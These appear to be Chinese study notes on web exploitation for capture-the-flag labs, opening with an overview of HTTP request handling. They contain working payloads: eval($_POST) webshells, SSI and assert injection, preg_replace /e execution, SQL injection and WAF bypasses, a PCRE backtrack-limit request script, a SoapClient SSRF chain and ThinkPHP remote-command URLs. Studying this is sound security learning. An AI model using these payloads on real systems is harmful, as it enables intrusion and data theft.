
1. 用户发出请求
用户输入 URL：用户在浏览器中输入一个 URL，例如 https://example.com，或者点击一个链接。
浏览器构建请求：
浏览器解析 URL，提取出协议（如 https）、主机名（如 example.com）、路径（如 /index.html）和查询参数。
如果是 HTTPS 请求，浏览器会建立一个加密的 TLS 连接。
浏览器构建一个 HTTP 请求，其中包含请求行（如 GET /index.html HTTP/1.1）、请求头（如 Host: example.com）以及可能的请求体（POST 请求时可能包含表单数据）。
2. DNS 解析
DNS 查询：浏览器会通过 DNS 服务器将域名（如 example.com）解析为服务器的 IP 地址。
缓存检查：浏览器会先检查本地缓存或操作系统的 DNS 缓存，看是否有域名对应的 IP 地址，若无则通过 DNS 服务器查询。
3. 建立连接
TCP 连接：浏览器与服务器的 IP 地址之间建立 TCP 连接，这通常通过三次握手完成。
TLS/SSL 握手（如果是 HTTPS）：在 TCP 连接之上，如果是 HTTPS 请求，会建立一个加密的 TLS 连接，确保数据的安全性。
4. 发送 HTTP 请求
发送请求：浏览器通过建立的 TCP 连接发送构建好的 HTTP 请求。
请求头：浏览器会包含一些常见的请求头，如 User-Agent（浏览器信息）、Accept（浏览器接受的数据类型）等。
携带 Cookie：如果之前与服务器有过交互，浏览器可能会附带 Cookie 信息，以维持会话状态。
5. 服务器处理请求
接收请求：Web 服务器（如 Apache、Nginx）接收到来自浏览器的请求。
处理请求：Web 服务器根据请求的路径，将请求转发给相应的应用程序（如 PHP、Node.js、Python 等）或直接返回静态资源（如 HTML、CSS、JS 文件）。
运行应用程序：
如果是动态请求（如 /login），服务器可能会调用后台逻辑，通过应用程序语言（如 PHP、Python、Java 等）处理请求。
服务器可能会查询数据库、执行业务逻辑、处理用户输入等。
生成响应：应用程序生成 HTML、JSON、XML 等响应数据。
6. 返回响应
HTTP 响应：服务器将生成的响应数据封装成 HTTP 响应，包括状态行（如 HTTP/1.1 200 OK）、响应头（如 Content-Type: text/html）、响应体（即实际的数据）。
发送响应：服务器通过 TCP 连接将响应发送回浏览器。
7. 浏览器接收响应并呈现页面
接收并解析响应：
浏览器接收到服务器的 HTTP 响应后，首先检查响应头，并根据 Content-Type 来确定如何处理响应体。
如果是 HTML 内容，浏览器会开始解析 HTML 文档。
资源加载：
在解析 HTML 的过程中，浏览器会发现其他资源（如 CSS、JavaScript、图片等）的链接，会发起新的 HTTP 请求来加载这些资源。
执行 JavaScript：
浏览器解析并执行 JavaScript 代码，可能会对 DOM 进行修改、处理用户事件等。
渲染页面：
浏览器根据 HTML、CSS、JavaScript 渲染出最终的页面，用户在浏览器中看到完整的网页。
8. 用户与页面交互
事件处理：
用户可以通过点击按钮、输入文本、提交表单等方式与页面进行交互。
这些操作会触发浏览器中的事件处理机制，JavaScript 代码可以捕获这些事件并作出相应的反应。
AJAX 请求：
在现代 Web 应用中，页面上的某些操作可能会触发 AJAX 请求，这是一种无需刷新页面即可与服务器进行数据交换的技术。
AJAX 请求的结果可以直接更新页面的部分内容，从而提供更加流畅的用户体验。
9. 服务器再次处理新请求（如果有）
服务器响应：
如果用户交互导致新的 HTTP 请求（如提交表单、点击链接），流程会再次进入服务器处理请求的步骤。
服务器接收到新请求后，会处理请求并生成新的响应，返回给浏览器。
10. 浏览器呈现更新后的页面
局部更新：
如果是 AJAX 请求，服务器返回的数据会由 JavaScript 处理并更新页面的部分内容，而无需刷新整个页面。
完整页面加载：
如果是页面的完整加载，浏览器会重新渲染整个页面。
总结
浏览器和服务器交互：用户通过浏览器发起请求，服务器处理请求并返回响应，浏览器解析响应并呈现页面。
动态与静态内容：Web 服务器可以提供静态文件，也可以运行动态应用程序生成响应内容。
用户交互：用户通过页面进行交互，可能会引发新的请求或局部页面更新。







认证绕过
    在身份认证时，在请求包的Header头中携带了特定参数，则可能绕过认证模块从而访问到后面的内容；也可能是加密模块存在一些漏洞，导致Cookie的内容可以被伪造
	
	修改包参数绕过
		参数绕过	
			在前端中存放着大量的javascript文件，在一些前后端分离的网站，通过前端请求后端数据包，在后端发送的响应包中获取相应的参数进行一个身份校验，当我们捕获了后端响应包并进行修改，通过这种方式可以绕过前端的检测机制，从而登录到网站后台中。
			Header头
			漏洞页面一般存在当请求包是由内部访问时，会放松认证机制，从而直接登录到网站后台，造成未授权访问。
			在PHP中该类变量存放在$_SERVER数组中，如：$_SERVER["HTTP_X_FORWARDED_FOR"]、$_SERVER["HTTP_REFERER"]、$_SERVER["HTTP_USER_AGENT"]、$_SERVER["HTTP_ACCEPT_LANGUAGE"]等变量是可以直接通过修改请求包中的参数进行伪造的。
			除此之外，还有一些开发者自定义的的头参数，例如：$_SERVER["HTTP_X_REAL_IP"]、$_SERVER["HTTP_CLIENT_IP"]、$_SERVER["HTTP_X_REMOTE_IP"]均可表示请求来源的IP，当X-Forwarded-For伪造无效时，可尝试用X-Real-IP、Client-IP、X-Remote-IP等。
	JWT
	ssi注入漏洞
	程序直接将用户名写入shtml中，如果我们的用户名是一串有意义的shtml代码username=<!--#exec cmd="ls ../" -->&password=2020666
	用户名的位置自然就能回显出执行结果
	
	
	[\$_SERVER](https://www.php.net/manual/zh/reserved.variables.server.php)是一个包含了诸如头信息（header）、路径（path）、以及脚本位置（script locations）等信息的 array。题目中使用的\$_SERVER['QUERY_STRING']返回查询(query)的字符串，也就是GET请求中?后的内容。
	\$_SERVER['QUERY_STRING']有一个特点：不会对传入键值对进行url解码。等于说我们把查询字符串全部url编码后这些正则全部没用。下一关。
	\$_REQUEST同时接收GET和POST的传参，但POST拥有更高的优先级，当\$_GET和\$_POST中的键相同时，\$_POST的值将覆盖\$_GET的值。那解法显而易见了，用bp发个post包，post数据发送和get同名的参数。

	
	
create_function代码注入  但它从PHP 7.2.0开始被标记为已弃用，并在PHP 8.0.0中被移除。
$newfunc = create_function('$a,$b', 'return $a+$b;');
//等同于
function newfunc($a,$b){
    return $a+$b;
}
$newfunc = create_function('', '}eval($_POST["cmd"]);//');
等同于
function newfunc(){
}eval($_POST["cmd"]);//}



preg_replace加上/e选项导致的[命令执行] --PHP 5.5 之前的一个特性
return preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
preg_replace 函数使用正则表达式进行搜索和替换操作。
/(' . $regex . ')/ei 是正则表达式模式，其中 $regex 是动态传入的正则表达式字符串，e 修饰符表示执行替换中的 PHP 代码（这是 PHP 5.5 之前的一个特性，现在已经被弃用），i 修饰符表示匹配时忽略大小写。
'strtolower("\\1")' 是替换部分，其中 \\1 代表第一个捕获组的内容，这里的作用是将匹配到的文本转换为小写。
$value 是要进行操作的目标字符串。
上面的命令执行，相当于 eval('strtolower("\\1");') 结果，当中的 \\1 实际上就是 \1 
原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});  我们为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1}
.* 是通过 GET 方式传入，发现我们传上去的 .* 变成了 _* ，这是由于在PHP中，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。当非法字符为首字母时，只有点号会被替换成下划线：
利用  
    对于类似return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
	传入?\S*=${getFlag()}
  
  
  
escapeshellarg:
(PHP 4 >= 4.0.3, PHP 5, PHP 7)
把字符串转码为可以在 shell 命令里使用的参数
string escapeshellarg ( string $arg )
escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符
概述：
1.确保用户只传递一个参数给命令
2.用户不能指定更多的参数一个
3.用户不能执行不同的命令
escapeshellcmd:
(PHP 4, PHP 5, PHP 7)
shell 元字符转义
string escapeshellcmd ( string $command )
escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$, \x0A 和 \xFF；' 和 " 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替
概述：
1.确保用户只执行一个命令
2.用户可以指定不限数量的参数
3.用户不能执行不同的命令
例子 <?php
	$username = 'h3rmesk1t;id';
	system(escapeshellcmd('groups '.$username));
?>

=>
groups: ‘h3rmesk1t;id’: no such user
myuser;id被当成了一个字符串
已知的绕过/利用
压缩some_file到/tmp/sth
$command = '-cf /tmp/sth /some_file';
system(escapeshellcmd('tar '.$command));
创建一个空文件/tmp/exploit
$command = "--use-compress-program='touch /tmp/exploit' -cf /tmp/passwd /etc/passwd";
system(escapeshellcmd('tar '.$command));

字符串`' <?php @eval($_POST["hack"]);?> -oG hack.php '`然后escapeshellarg过后，字符串变成了这样：''\''<?php @eval($_POST["hack"]);?> -oG hack.php '\'''escapeshellcmd之后''\\''\<\?php @eval\(\$_POST\["hack"\]\)\;\?\> -oG hack.php '\\'''
答案：传给nmap的host为\<\?php @eval\(\$_POST\["hack"\]\)\;\?\>。-oG是一个选项
  
  
  
通过构造动态调用函数  
例子：  $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})
分析：  $pi=hex2bin("5f474554")=>_GET $$pi取出真正的_GET数组，$p得到的_GET只是字符串；因为[]被禁了就用{}代替，最后的得：
(_GET){pi}((_GET){abs})
if (isset($text) && file_exists($file) && file_get_contents($file) === "I have a dream") {
使用 file_get_contents($file) 来读取文件内容，而不是 file_get_contents($text, 'r')
?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0
php://input 读取原始 POST 数据：
file_get_contents('php://input') 只能读取原始 POST 数据，而不是 $_POST 键值对。
例如，如果你发送的是 debu=aqua_is_cute&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2，则 php://input 会读取整个 debu=aqua_is_cute&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2 作为字符串


pcre回溯
假设要匹配的正则是<\?.\*[(`;?>].\*，输入是`<?php phpinfo();//aaaaa`。NFA一点一点读正则表达式。

**<**\?.\*[(`;?>].\*<Br>
**<**?php phpinfo();//aaaaa
正则的<匹配了输入的<。当前匹配成功则读取下一个字符。
**<\?**.\*[(`;?>].\*<br>
**<\?** php phpinfo();//aaaaa
?也匹配成功，继续。
**<\?.\***[(`;?>].\*<br>
**<\? php phpinfo();//aaaaa**
`.*`会匹配完接下来的所有字符，目前是没什么问题，但是读取下一个正则时就出问题了。
**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();//aaaaa** ？
发现输入已经没东西匹配了。此时NFA开始回溯，回退之前匹配的字符。
**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();//aaaa**a ？
回退出来的字符a仍然无法匹配[(`;?>]。继续回溯。
**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();//aaa**aa ？
还是不行。回溯这一步骤会重复执行，直到回溯到下面的状态。
**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo()**;//aaaaa ？
这一步回溯回退出来的字符是`;`，匹配正则表达式[(`;?>]。便停止回溯，匹配上字符。
**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();**//aaaaa
最后的一个正则表达式匹配完接下来的所有内容。
**<\?.\*[(`;?>].\***<br>
**<\? php phpinfo();//aaaaa**
完全匹配成功，返回true。如果我们数一下，会发现回溯次数为8，而回溯次数是有上限的，默认是100万。如果输入字符串执行正则时回溯次数超过了这个上限，就会返回f
alse。此false非彼False，`var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);`返回的结果是bool(true)。但这个false可以被强制转换，下面的waf：
$input = "SELECT * FROM users WHERE id = 1 UNION " . str_repeat("/*!A*/ ", 10000) . "SELECT name, email FROM users;";

if (preg_match('/UNION.+?SELECT/is', $input)) {
    die('SQL Injection');
} else {
    echo "No SQL Injection detected.";
}

就可以利用pcre的回溯次数限制绕过。但是下面的waf：
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

if(is_php($input) === 0) {
    // fwrite($f, $input); ...
}就不可以。使用了===强等于，PREG_BACKTRACK_LIMIT_ERROR不等于0。利用这一特点，我们可以在payload末尾加一堆a，使其超过回溯限制。

```python
import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
res = requests.post("http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/", data={"cmd":payload})
#print(payload)
print(res.text)
```
import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
res = requests.post("http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/", data={"cmd":payload})
#print(payload)
print(res.text)






函数
preg_match(pattern, subject, matches, flags, offset);
pattern: 正则表达式模式，用于描述你想要匹配的文本格式。通常用斜杠 / 来包围正则表达式。
subject: 要搜索的字符串。
matches: （可选）数组，返回匹配结果。如果有匹配，matches[0] 包含完全匹配的部分，matches[1] 包含第一个捕获组的匹配内容，依此类推。
flags: （可选）控制匹配行为的标志，例如是否匹配所有结果（PREG_OFFSET_CAPTURE）。
offset: （可选）指定从字符串的哪个位置开始搜索。
$pattern = '/hello/i';
$subject = 'Hello World!';
if (preg_match($pattern, $subject, $matches)) {
    echo "Match found: " . $matches[0]; // 输出 "Match found: Hello"
} else {
    echo "No match found.";
}
正则表达式模式详细解读
定界符:

正则表达式通常用定界符（例如 /）包围。定界符可以是任意非字母数字的符号，例如 #, %, ~。
示例：/pattern/ 或 #pattern#。
普通字符:

正则表达式中的普通字符（如 a, b, c）直接匹配字符串中的字符。
示例：/cat/ 匹配 "cat"。
元字符:

元字符具有特殊含义，如 . 匹配任意字符，* 匹配前一个字符的零次或多次，+ 匹配前一个字符的一次或多次。
示例：/c.t/ 匹配 "cat", "cot", "cut" 等。
字符类:

使用方括号 [] 定义字符类，可以匹配其中任意一个字符。
示例：/[aeiou]/ 匹配任何一个元音字母。
否定字符类:

使用 ^ 在字符类的开头表示否定字符类，即匹配不在其中的任何字符。
示例：/[^aeiou]/ 匹配任何非元音字母。
预定义字符类:
\d 匹配任意数字（相当于 [0-9]）。
\D 匹配任意非数字字符。
\w 匹配任意字母、数字或下划线（相当于 [a-zA-Z0-9_]）。
\W 匹配任意非字母、非数字或非下划线字符。
\s 匹配任意空白字符（空格、制表符等）。
\S 匹配任意非空白字符。
量词:

{n} 精确匹配 n 次。
{n,} 至少匹配 n 次。
{n,m} 匹配 n 到 m 次。
* 匹配零次或多次（相当于 {0,}）。
+ 匹配一次或多次（相当于 {1,}）。
? 匹配零次或一次（相当于 {0,1}）。
preg_match('/a{3}/', 'aaa') // 匹配成功，匹配 "aaa"
preg_match('/a{2,4}/', 'aaaa') // 匹配成功，匹配 "aaaa"
捕获组:

使用圆括号 () 创建捕获组，捕获组中的内容会被捕获到 matches 数组中。
示例：/(hello) (world)/ 匹配 "hello world"，matches[1] 会是 "hello"，matches[2] 会是 "world"。
选择符 |:

用于匹配多个模式中的一个。
示例：/cat|dog/ 匹配 "cat" 或 "dog"。
锚点:

^ 匹配字符串的开头。
$ 匹配字符串的结尾。
示例：/^hello/ 匹配 "hello" 仅当它出现在字符串的开头。
hello$/ 匹配 "hello" 仅当它出现在字符串的结尾。
零宽断言:

肯定先行断言 (?=...)：匹配条件前面的位置，但不消耗字符。
否定先行断言 (?!...)：匹配条件前面的位置，并且不允许后面有特定内容。
肯定后行断言 (?<=...)：匹配条件后面的位置。
否定后行断言 (?<!...)：匹配条件后面的位置，但不允许前面有特定内容。
preg_match('/\d(?= dollars)/', '5 dollars') // 匹配成功，返回 "5"
preg_match('/\d(?! dollars)/', '5 euros') // 匹配成功，返回 "5"
(?R):

这是一个递归模式的用法。它表示在当前位置重新应用整个正则表达式。这用于匹配嵌套结构，如嵌套的函数调用。
\(([^()]*|(?R))\)
解释：
\( 和 \): 匹配开括号 ( 和闭括号 )。
[^()]*: 匹配括号之间的任意内容，只要不包含括号（这部分匹配最简单的情况）。
(?R): 递归地匹配整个模式，处理嵌套的情况。
这个正则表达式的逻辑如下：

匹配一个开括号 (。
接下来尝试匹配括号内的内容：
如果括号内没有嵌套，只匹配 [^()]*。
如果括号内有嵌套，(?R) 会重新匹配整个正则表达式，从而处理嵌套的括号对。
匹配闭括号 )
示例 2: 处理嵌套的函数调用
在 PHP 代码中使用的示例 preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']) 实际上是为了处理像 func1(func2(func3())) 这样的嵌套函数调用。正则表达式通过递归匹配来捕获可能的嵌套结构。

regex
复制代码
[a-z,_]+\((?R)?\)
解释：
[a-z,_]+: 匹配函数名部分，由小写字母、下划线或逗号组成。
\( 和 \): 匹配函数调用中的括号。
(?R)?: 可选的递归匹配，用于处理嵌套函数调用。? 使得它变成可选的，以便处理最内层没有嵌套的函数调用。
Flags 详解
i: 忽略大小写匹配。
s: 使 . 能够匹配换行符。
m: 多行模式。^ 和 $ 会匹配每一行的开头和结尾，而不仅仅是整个字符串的开头和结尾。
u: 启用 Unicode 匹配，使得 \w, \d 等可以匹配 Unicode 字符。
示例代码
1. 匹配简单文本
$pattern = '/cat/';
$subject = 'I have a cat';
preg_match($pattern, $subject, $matches);
echo $matches[0];  // 输出 "cat"
2. 匹配带忽略大小写
$pattern = '/cat/i';
$subject = 'I have a Cat';
preg_match($pattern, $subject, $matches);
echo $matches[0];  // 输出 "Cat"
3. 捕获组
$pattern = '/(cat) (dog)/';
$subject = 'I have a cat dog';
preg_match($pattern, $subject, $matches);
echo $matches[1];  // 输出 "cat"
echo $matches[2];  // 输出 "dog"
4. 使用多种匹配模式
$pattern = '/^Hello.*World$/';
$subject = "Hello\nWorld";
preg_match($pattern, $subject, $matches);
echo $matches[0];  // 输出 "Hello\nWorld"

$pattern = '/^Hello.*World$/s';
preg_match($pattern, $subject, $matches);
echo $matches[0];  // 输出 "Hello\nWorld"（由于 `s` 标志，`.` 匹配了换行符）




json_decode($json, true)['cmd'];
json_decode()是一个用于将 JSON 格式的字符串转换为 PHP 数据结构（数组或对象）的函数
$json 是输入的 JSON 字符串，它是一个有效的 JSON 格式的数据。
true 参数：
如果设置为 true，json_decode() 将返回一个关联数组。
如果设置为 false 或省略，则返回一个对象。
['cmd']:

在 PHP 中，方括号 [] 用于访问数组中的某个键对应的值。
json_decode($json, true) 返回的是一个关联数组，['cmd'] 是在这个数组中访问键为 cmd 的元素
示例
假设 $json 变量包含以下 JSON 数据：
$json = '{"cmd": "echo hello", "user": "admin"}';
运行过程
json_decode($json, true) 将 JSON 字符串解析为 PHP 关联数组：

$array = json_decode($json, true);
// $array 现在等于：["cmd" => "echo hello", "user" => "admin"]
$array['cmd'] 访问数组中的 cmd 键：

$command = $array['cmd'];
// $command 现在等于 "echo hello"
json_decode($json, false) 将 JSON 字符串解析为一个 PHP 对象：


$object = json_decode($json, false);
// $object 现在是一个对象，其属性如下：
// $object->cmd = "echo hello"
// $object->user = "admin"



preg_replace()
preg_replace(pattern, replacement, subject, limit, count)
pattern: 一个正则表达式字符串或数组，用于匹配要替换的内容。
replacement: 替换字符串或数组，与 pattern 对应的匹配项将被替换为这个值。这里使用 NULL，意味着将匹配的部分移除
subject: 输入的字符串或数组，即你要在其中进行替换操作的内容。
limit: （可选）最大替换次数。默认是无限制的替换。
count: （可选）一个变量，传递给 preg_replace，用于返回实际发生的替换次数。
$text = "The quick brown fox jumps over the lazy dog";
// 定义要匹配的模式和对应的替换字符串
$patterns = array('/quick/', '/brown/', '/lazy/');
$replacements = array('slow', 'red', 'energetic');
// 使用 preg_replace 进行替换
$new_text = preg_replace($patterns, $replacements, $text);
echo $new_text;  // 输出 "The slow red fox jumps over the energetic dog"
$patterns: 这是一个数组，包含多个正则表达式模式。在这个例子中，/quick/、/brown/ 和 /lazy/ 是要匹配的单词。
$replacements: 这是一个数组，包含与 $patterns 中模式对应的替换字符串。在这个例子中，'slow' 替换 'quick'，'red' 替换 'brown'，'energetic' 替换 'lazy'。
preg_replace(): 对 $text 中的每个模式进行搜索，并将其替换为对应的字符串。



assert注入
 assert("intval($_GET[num])==1919810")
 assert里面直接把我们的输入拼接进去了?num=114514)==114514;//
 
 
 
phpmyadmin 4.8.1的一个任意文件包含漏洞
这个漏洞要利用
需要有一个比较苛刻的前提：能够访问phpmyadmin，也就是说得拿到phpmyadmin的权限才可以。
访问http://83878456-a710-4e71-9a95-44708cb1e6ea.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag，结果表明存在文件包含漏洞：



尝试堆叠注入
1;show databases;
[use](https://www.yiibai.com/sql/sql-select-database.html)语句用于选择数据库。然后我就不会了。看大佬说，这里的query参数无论我们输入数字什么都只会回显Array([0]= > 1)，输入字母不会显，但是也没显示是过滤的，所以query的值如果为非数字则无法正确查询得到数据回显，那么查询语句就应该长这样
$sql="select".$_POST['query']." || flag from Flag";
假如使用或的两个被查询内容有相同的字符，就返回1；否则返回0。在猜到查询语句后，我们可以这么构造payload。
$sql="select *,1 || flag from Flag";
逗号作为查询内容的分割，select * from Flag是第一个，select 1 || flag from Flag是第二个。第一个返回的内容都很熟悉，第二个返回什么已经不重要了，flag已经出来了。
1 || flag:
|| 是 SQL 中用于字符串连接（concatenation）的操作符。
1 是一个字符串常量，将被视为字符串 '1'。
flag 是表 Flag 中的一列。
1 || flag 的作用是将字符串 '1' 和列 flag 中的值连接起来。例如，如果 flag 列的某一行中包含值 'abc'，那么 1 || flag 的结果将是 '1abc'。
| id | flag | 1 || flag | |----|------|-----------| | 1 | abc | 1abc | | 2 | def | 1def | | 3 | ghi | 1ghi |
还有另一种方法。堆叠注入功能强大，我们甚至可以利用[sql_mode](https://blog.csdn.net/qq_41453285/article/details/117690689)改配置。
这样能把||设置为连接符而不是逻辑或。于是我们再查询时就能把flag带出来了。
- 1;set sql_mode=PIPES_AS_CONCAT;select 1
$sql="select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag from Flag";由于改成了连接符，select 1 || flag from Flag效果就变成了select 1 from Flag的查询结果和select flag from Flag的查询结果的拼接。



我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
/news.php?%20news[id%00=42"+AND+1=0--
上述PHP语句的参数%20news[id%00的值将存储到$_GET["news_id"]中。
HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
1.删除空白符
2.将某些字符转换为下划线（包括空格）
  %20foo_bar%00            	                foo_bar            	                foo_bar            
                foo%20bar%00            	                foo bar            	                foo_bar            
                foo%5bbar            	                foo[bar            	                foo_bar     

?%20num=var_dump(scandir(chr(47)))

[$_SERVER['PHP_SELF']](http://www.5idev.com/p-php_server_php_self.shtml)表示当前 php 文件相对于网站根目录的位置地址，例如：

```
http://www.5idev.com/php/ ：/php/index.php
http://www.5idev.com/php/index.php ：/php/index.php
http://www.5idev.com/php/index.php?test=foo ：/php/index.php
http://www.5idev.com/php/index.php/test/foo ：/php/index.php/test/foo
```
[basename](https://www.php.net/manual/zh/function.basename.php)则是返回路径中的文件名部分。但是basename有个特性，如果文件名是一个不可见字符，便会将上一个目录作为返回值。比如：
highlight_file(basename($_SERVER['PHP_SELF']));
```php
$var1="/config.php/test"
basename($var1)	=> test
$var2="/config.php/%ff"
basename($var2)	=>	config.php
```
当我们访问一个`存在的文件/不存在的文件`这个url时，php会自动忽略多余的不存在的部分，比如下面两种url：

```
/index.php
/index.php/dosent_exist.php
```











php会把session以序列化的形式存储在一个文件里，不同的处理器决定以何种方式存储。假如我们先用php_serialize处理器，发送`a=|O:4:“test”:0:{}`，那么session文件里存储的就是`a:1:{s:1:“a”;s:16:"|O:4:“test”:0:{}";}`。这时换成php处理器来读取，处理器就会把`a:1:{s:1:“a”;s:16:"`看成键名，`O:4:“test”:0:{}";}`看成值，session读取时再反序列化一下，一个类就这么诞生了。

默认是php处理器，我们可以用`session_start(['serialize_handler'=>'php_serialize'])`将处理器改成php_serialize注入。注入什么呢？看大佬脚本。

```php
<?php
$target = "http://127.0.0.1/flag.php";
$attack = new SoapClient(null,array('location' => $target,
    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
    'uri' => "123"));
$payload = urlencode(serialize($attack));
echo $payload;
"""
O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
"""
```

这里还用了一个[CRLF注入](https://www.anquanke.com/post/id/240014)。CRLF 是回车符（CR，ASCII 13，\r，%0d）和换行符（LF，ASCII 10，\n，%0a）的简称（\r\n）。在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。代码中的`\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n`正是如此，利用这个方法，我们伪造了一个cookie，让服务器ssrf时带上这个cookie。

接下来我们把一切和在一起。get传参f=session_start&name=`|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`;post传参serialize_handler=php_serialize，将反序列化解释器改为php_serialize。发送后把注入内容写入cookie。
最后就是触发反序列化漏洞了。还有一个知识点，call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法。下一步get传f=extract&name=SoapClient；post传b=call_user_func，触发变量覆盖漏洞，覆盖b为call_user_func。这时`call_user_func($b, $a);`就变成了`call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018'));`。reset(\$_SESSION)指的是session的第一个元素，即`$_SESSION['name'] = $_GET['name'];`，这也是为什么我们要传name=SoapClient。SoapClient明显没有welcome_to_the_lctf2018这个方法，就会调用魔术方法__call()。SoapClient的魔术方法__call会发送请求，造成SSRF去访问flag.php。


ThinkPHP
payload在GitHub上也有人整理出来了。这里挑选出对我们有用的payload。

- http://61.147.171.105:62178/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system(%22find%20/%20-name%20%27flag%27%22);%27

其中vars[1][]后面的内容可以替换成任意你想要执行的命令。

- http://61.147.171.105:62178/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag




我们主要会用到三条命令

- ### set

  > 可以理解为设置变量或准备即将预编译的语句。
  > 语法：set @名称=值

- ### prepare

  > 预编译一条sql语句。
  > 语法：prepare 语句名 from 语句

- ### execute

  > 执行预编译语句
  > 语法：execute 语句名 \[变量]\(可选)

那么我们可以准备下面这个payload：

- ?inject=1';set @sql=concat('s','elect * from \`1919810931114514`');PREPARE pre FROM @sql;EXECUTE pre; #

  > 不能直接拼接select，因为这样就是字符串而不是可以执行的语句了。

这条语句意为：set准备需要的select语句（用concat拼接字符串绕过过滤，prepare预编译语句，execute执行语句。








-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- ### mb_substr()
- > 返回字符串的一部分，中文字符也可以使用。substr() 只针对英文字符
- > 语法：mb_substr(字符串，起始，长度，编码)，其中长度和编码可选。
- ### mb_strpos()
- > 返回要查找的字符串在别一个字符串中首次出现的位置
- > 语法：mb_strpos (字符串,要搜索的字符串)
因为mb_strpos()只会返回首次出现的位置，所以如果我们传类似于 hint.php?想要查看的文件路径 这样的payload的话，切割的结果是hint.php，通过了过滤。问题是过滤通过了后这个paylaod根本就不是一个有效的文件名啊？
不急。include有一个很有趣的特性：
- 如果参数中包含../这样的路径，解析器则会忽略../之前的字符串而去在当前目录的父目录下寻找文件
这意味着我们只要在想要查看的文件路径中使用../这类路径，include就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。



- ### strstr()
- > 搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。
- > 语法：strstr(string,search,before_search)
- > string:必需。规定被搜索的字符串。
- > search:必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。
- > before_serach:可选。一个默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。
注意这个函数是大小写敏感的。这里可以用PHP://绕过，也可以考虑另外一个php伪协议：data://





